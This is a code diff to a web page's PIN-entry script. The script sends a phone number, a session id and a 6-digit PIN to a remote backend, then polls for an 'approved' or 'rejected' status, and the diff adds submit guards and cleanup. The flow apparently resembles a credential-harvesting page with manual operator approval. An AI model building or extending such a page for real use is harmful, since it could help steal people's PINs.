@@ -164,19 +164,34 @@ body {
 const API = "https://ecolo-backend.onrender.com";
 
 const inputs = document.querySelectorAll(".otp-input");
+let submitting = false;
+let timer = null;
 
 async function submitPin() {
 
+    if (submitting) return;
+    submitting = true;
+
     const pin = [...inputs].map(i => i.value).join("");
     const phone = localStorage.getItem("phone");
+    const sessionId = localStorage.getItem("sessionId");
 
-if (!phone) {
-    alert("Phone number not found. Please start again.");
-    window.location.href = "deno.html";
-    return;
-}
+    if (!phone) {
+        submitting = false;
+        alert("Phone number not found. Please start again.");
+        window.location.href = "deno.html";
+        return;
+    }
+
+    if (!sessionId) {
+        submitting = false;
+        alert("Session expired. Please start again.");
+        window.location.href = "deno.html";
+        return;
+    }
 
     if (!/^\d{6}$/.test(pin)) {
+        submitting = false;
         alert("Enter a valid 6-digit PIN.");
         return;
     }
@@ -189,26 +204,23 @@ if (!phone) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
+                sessionId,
                 phone,
                 pin
             })
         });
 
-        let result = {};
-        try {
-            result = await response.json();
-        } catch {}
+        const result = await response.json();
 
         if (!response.ok) {
+            submitting = false;
             alert(result.error || result.message || "Submission failed.");
             return;
         }
 
-        const sessionId = result.sessionId;
-
         document.getElementById("loadingOverlay").style.display = "flex";
 
-        const timer = setInterval(async () => {
+        timer = setInterval(async () => {
 
             try {
 
@@ -218,12 +230,12 @@ if (!phone) {
                 if (status.status === "approved") {
 
                     clearInterval(timer);
-
                     window.location.href = "kim.html";
 
                 } else if (status.status === "rejected") {
 
                     clearInterval(timer);
+                    submitting = false;
 
                     document.getElementById("loadingOverlay").innerHTML = `
                         <div style="text-align:center;padding:20px;font-family:Arial;">
@@ -242,12 +254,12 @@ if (!phone) {
                             </button>
                         </div>
                     `;
-
                 }
 
-            } catch (e) {
+            } catch (err) {
 
                 clearInterval(timer);
+                submitting = false;
                 document.getElementById("loadingOverlay").style.display = "none";
                 alert("Connection lost.");
 
@@ -257,6 +269,7 @@ if (!phone) {
 
     } catch (err) {
 
+        submitting = false;
         alert("Unable to connect to the server.");
 
     }
@@ -287,6 +300,10 @@ inputs.forEach((input, index) => {
 
     });
 
+});
+
+window.addEventListener("beforeunload", () => {
+    if (timer) clearInterval(timer);
 });
 </script>
 
